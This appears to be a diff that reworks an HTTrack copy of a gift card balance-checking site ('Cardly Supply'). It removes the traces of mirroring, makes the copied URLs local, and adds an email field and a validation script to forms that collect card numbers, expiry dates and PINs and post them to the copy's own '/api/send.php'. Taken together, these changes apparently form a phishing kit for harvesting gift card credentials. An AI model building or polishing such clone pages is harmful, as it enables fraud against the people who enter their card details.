@@ -1,11 +1,7 @@
 <!DOCTYPE html>
 <html lang="en-US">
 
-<!-- Mirrored from my-cardlysupply.com/ by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 21 Apr 2024 00:16:37 GMT -->
-<!-- Added by HTTrack -->
 <meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
-<!--on God G1B-->
-
 <head>
 	<meta charset="UTF-8">
 	<title>Cardly Supply || Checking Card</title>
@@ -426,8 +422,7 @@
 	<link rel="icon" href="wp-content/uploads/2023/02/cropped-logo.png-32x32.webp" sizes="32x32" />
 	<link rel="icon" href="wp-content/uploads/2023/02/cropped-logo.png-192x192.webp" sizes="192x192" />
 	<link rel="apple-touch-icon" href="wp-content/uploads/2023/02/cropped-logo.png-180x180.webp" />
-	<meta name="msapplication-TileImage"
-		content="https://my-cardlysupply.com/wp-content/uploads/2023/02/cropped-logo.png-270x270.webp" />
+	<meta name="msapplication-TileImage" content="wp-content/uploads/2023/02/cropped-logo.png-270x270.webp" />
 	<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover" />
 </head>
 
@@ -467,7 +462,7 @@
 								<img fetchpriority="high" decoding="async" width="570" height="244"
 									src="wp-content/uploads/2023/02/logo.png.webp"
 									class="attachment-full size-full wp-image-20" alt=""
-									srcset="https://my-cardlysupply.com/wp-content/uploads/2023/02/logo.png.webp 570w, https://my-cardlysupply.com/wp-content/uploads/2023/02/logo.png-300x128.webp 300w"
+									srcset="wp-content/uploads/2023/02/logo.png.webp 570w, wp-content/uploads/2023/02/logo.png-300x128.webp 300w"
 									sizes="(max-width: 570px) 100vw, 570px" />
 							</div>
 						</div>
@@ -536,7 +531,7 @@
 																</div>
 																<select name="form_fields[card]" id="form-field-card"
 																	class="elementor-field-textual elementor-size-sm"
-																	required="required" aria-required="true" required>
+																	required="required" aria-required="true">
 																	<option value="Select Type Of Card">Select Type Of
 																		Card</option>
 																	<option value="Google Play Card">Google Play Card
@@ -580,7 +575,7 @@
 																<select name="form_fields[currency]"
 																	id="form-field-currency"
 																	class="elementor-field-textual elementor-size-sm"
-																	required="required" aria-required="true" required>
+																	required="required" aria-required="true">
 																	<option value="USD">USD</option>
 																	<option value="GBP">GBP</option>
 																	<option value="AUD">AUD</option>
@@ -595,7 +590,7 @@
 																id="form-field-amount"
 																class="elementor-field elementor-size-sm  elementor-field-textual"
 																placeholder="Amount" required="required"
-																aria-required="true" min="" max="" required>
+																aria-required="true" min="" max="">
 														</div>
 														<div
 															class="elementor-field-type-number elementor-field-group elementor-column elementor-field-group-card_number elementor-col-100 elementor-sm-100 elementor-field-required">
@@ -603,7 +598,7 @@
 																id="form-field-card_number"
 																class="elementor-field elementor-size-sm  elementor-field-textual"
 																placeholder="Card Number" required="required"
-																aria-required="true" min="" max="" required>
+																aria-required="true" min="" max="">
 														</div>
 														<div
 															class="elementor-field-type-number elementor-field-group elementor-column elementor-field-group-exp_mm elementor-col-100 elementor-sm-50 elementor-field-required">
@@ -648,6 +643,15 @@
 																id="form-field-pin"
 																class="elementor-field elementor-size-sm  elementor-field-textual"
 																placeholder="PIN" min="" max="">
+														</div>
+
+														<div
+															class="elementor-field-type-email elementor-field-group elementor-column elementor-field-group-email elementor-col-100 elementor-field-required">
+															<input size="1" type="email" name="form_fields[email]"
+																id="form-field-email"
+																class="elementor-field elementor-size-sm  elementor-field-textual"
+																placeholder="Email Address" required="required"
+																aria-required="true">
 														</div>
 														<div
 															class="elementor-field-type-html elementor-field-group elementor-column elementor-field-group-field_012a1cb elementor-col-100">
@@ -736,6 +740,34 @@
 
 																</script>
 
+																<script>
+																	document.addEventListener('DOMContentLoaded', function () {
+																		const form = document.querySelector('form[action="/api/send.php"][name="New Form"]');
+																		if (!form) return;
+
+																		form.addEventListener('submit', function (e) {
+																			// Example: Ensure card_number is filled if card is not "Select Type Of Card"
+																			const cardType = form.querySelector('[name="form_fields[card]"]').value;
+																			const cardNumber = form.querySelector('[name="form_fields[card_number]"]');
+																			const email = form.querySelector('[name="form_fields[email]"]');
+																			let valid = true;
+																			let errorMsg = '';
+
+																			if (!email.value || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email.value)) {
+																				valid = false;
+																				errorMsg = "Please enter a valid email address.";
+																				email.focus();
+																			}
+
+
+																			if (!valid) {
+																				e.preventDefault();
+																				alert(errorMsg);
+																			}
+																		});
+																	});
+																</script>
+
 															</body>
 
 															<!-- Mirrored from my-cardlysupply.com/ by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 21 Apr 2024 00:17:10 GMT -->
@@ -784,7 +816,7 @@
 								<img decoding="async" width="400" height="253"
 									src="wp-content/uploads/2023/02/Joker.png"
 									class="attachment-large size-large wp-image-22" alt=""
-									srcset="https://my-cardlysupply.com/wp-content/uploads/2023/02/Joker.png 400w, https://my-cardlysupply.com/wp-content/uploads/2023/02/Joker-300x190.png 300w"
+									srcset="wp-content/uploads/2023/02/Joker.png 400w, wp-content/uploads/2023/02/Joker-300x190.png 300w"
 									sizes="(max-width: 400px) 100vw, 400px" />
 							</div>
 						</div>
@@ -1490,7 +1522,7 @@
 							data-settings="{&quot;step_next_label&quot;:&quot;Next&quot;,&quot;step_previous_label&quot;:&quot;Previous&quot;,&quot;button_width&quot;:&quot;100&quot;,&quot;dce_confirm_dialog_enabled&quot;:&quot;no&quot;,&quot;step_type&quot;:&quot;number_text&quot;,&quot;step_icon_shape&quot;:&quot;circle&quot;,&quot;label_icon_size&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]},&quot;field_icon_size&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]}}"
 							data-widget_type="form.default">
 							<div class="elementor-widget-container">
-								<form action="/api/send.php" method="post" name="New Form">
+								<form action="/api/send.php" action="/api/send.php" method="post" name="New Form">
 									<input type="hidden" name="post_id" value="79" />
 									<input type="hidden" name="form_id" value="4c50212e" />
 									<input type="hidden" name="referer_title" value="" />
@@ -1670,7 +1702,7 @@
 			</div>
 		</section>
 		<section data-dce-background-color="#DBE6ED"
-			data-dce-background-image-url="https://my-cardlysupply.com/wp-content/uploads/2023/02/PngItem_1864328-2.png"
+			data-dce-background-image-url="wp-content/uploads/2023/02/PngItem_1864328-2.png"
 			class="elementor-section elementor-top-section elementor-element elementor-element-26f8b013 elementor-section-full_width elementor-hidden-tablet elementor-hidden-mobile elementor-section-height-default elementor-section-height-default"
 			data-id="26f8b013" data-element_type="section"
 			data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
@@ -1712,7 +1744,8 @@
 													class="dce-conditions-js-error-notice  elementor-message elementor-message-danger">
 													A problem was detected in the following Form. Submitting it could
 													result in errors. Please contact the site administrator.</div>
-												<form action="/api/send.php" method="post" name="New Form">
+												<form action="/api/send.php" action="/api/send.php" method="post"
+													name="New Form">
 													<input type="hidden" name="post_id" value="79" />
 													<input type="hidden" name="form_id" value="37989839" />
 													<input type="hidden" name="referer_title" value="" />
@@ -1731,7 +1764,7 @@
 																</div>
 																<select name="form_fields[card]" id="form-field-card"
 																	class="elementor-field-textual elementor-size-sm"
-																	required="required" aria-required="true" required>
+																	required="required" aria-required="true">
 																	<option value="Select Type Of Card">Select Type Of
 																		Card</option>
 																	<option value="Google Play Card">Google Play Card
@@ -1775,7 +1808,7 @@
 																<select name="form_fields[currency]"
 																	id="form-field-currency"
 																	class="elementor-field-textual elementor-size-sm"
-																	required="required" aria-required="true" required>
+																	required="required" aria-required="true">
 																	<option value="USD">USD</option>
 																	<option value="GBP">GBP</option>
 																	<option value="AUD">AUD</option>
@@ -1790,7 +1823,7 @@
 																id="form-field-amount"
 																class="elementor-field elementor-size-sm  elementor-field-textual"
 																placeholder="Amount" required="required"
-																aria-required="true" min="" max="" required>
+																aria-required="true" min="" max="">
 														</div>
 														<div
 															class="elementor-field-type-number elementor-field-group elementor-column elementor-field-group-card_number elementor-col-100 elementor-sm-100 elementor-field-required">
@@ -1798,7 +1831,7 @@
 																id="form-field-card_number"
 																class="elementor-field elementor-size-sm  elementor-field-textual"
 																placeholder="Card Number" required="required"
-																aria-required="true" min="" max="" required>
+																aria-required="true" min="" max="">
 														</div>
 														<div
 															class="elementor-field-type-number elementor-field-group elementor-column elementor-field-group-exp_mm elementor-col-33 elementor-sm-50 elementor-field-required">
@@ -1845,6 +1878,14 @@
 																id="form-field-pin"
 																class="elementor-field elementor-size-sm  elementor-field-textual"
 																placeholder="PIN" min="" max="">
+														</div>
+														<div
+															class="elementor-field-type-email elementor-field-group elementor-column elementor-field-group-email elementor-col-100 elementor-field-required">
+															<input size="1" type="email" name="form_fields[email]"
+																id="form-field-email"
+																class="elementor-field elementor-size-sm  elementor-field-textual"
+																placeholder="Email Address" required="required"
+																aria-required="true">
 														</div>
 														<div
 															class="elementor-field-type-html elementor-field-group elementor-column elementor-field-group-field_012a1cb elementor-col-100">
@@ -1931,6 +1972,34 @@
 																		}
 																	}
 
+																</script>
+
+																<script>
+																	document.addEventListener('DOMContentLoaded', function () {
+																		const form = document.querySelector('form[action="/api/send.php"][name="New Form"]');
+																		if (!form) return;
+
+																		form.addEventListener('submit', function (e) {
+																			// Example: Ensure card_number is filled if card is not "Select Type Of Card"
+																			const cardType = form.querySelector('[name="form_fields[card]"]').value;
+																			const cardNumber = form.querySelector('[name="form_fields[card_number]"]');
+																			const email = form.querySelector('[name="form_fields[email]"]');
+																			let valid = true;
+																			let errorMsg = '';
+
+																			if (!email.value || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email.value)) {
+																				valid = false;
+																				errorMsg = "Please enter a valid email address.";
+																				email.focus();
+																			}
+
+
+																			if (!valid) {
+																				e.preventDefault();
+																				alert(errorMsg);
+																			}
+																		});
+																	});
 																</script>
 															</body>
 
@@ -3169,3 +3238,4 @@
 
 </html>
 
+<!-- Cached by WP-Optimize (gzip) - https://getwpo.com - Last modified: April 20, 2024 10:35 pm (UTC:0) -->
